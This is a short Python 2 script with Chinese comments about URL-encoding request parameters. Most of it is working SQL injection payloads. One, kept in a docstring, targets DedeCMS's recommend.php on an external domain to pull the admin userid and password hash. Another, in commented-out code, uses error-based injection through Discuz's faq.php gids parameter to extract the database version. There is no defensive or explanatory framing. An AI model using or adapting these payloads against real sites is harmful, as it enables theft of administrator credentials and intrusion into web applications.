#coding=utf-8
import urllib
import urllib2
import requests,re,os
'''
这里解决了一个问题
这个问题是：
当使用requests或者urllib时 
附加的url参数会自动url编码导致访问出错
现在使用的urllib.qoute解决这个问题
详情：http://blog.csdn.net/my2010sam/article/details/9262141
url = "http://8888ln.com"
para = /plus/recommend.php?_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294&action=&aid=1&_FILES[type][tmp_name]=\\'%20or%20@`'`%20/*!5454union*//*!5454select*/1,2,3,(select%20concat(userid,pwd)+from+%23@__admin+limit+1),5,6,7,8,9%23@`'`
data = urllib.quote(para,"?@`[]*,+()/'&=!_%")
print data
url = "%s%s" % (url,data)
print url
print urllib.urlopen(url).read()
'''

# url = "http://localhost/discuz/upload/faq.php"
# payload = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x  )a)%23"
# r = requests.get("%s?%s" % (url,payload))
# pattern = re.compile(r"Duplicate entry '(.*?)'")
# print pattern.findall(r.content)

# f = open('data1.txt','rb')
# tmp_list = []
# for x in f:
# 	tmp_list.append(x.replace('\r\n',''))

# print tmp_list
# ret = os.popen('ftp -s:./1.txt').read()
# print ret



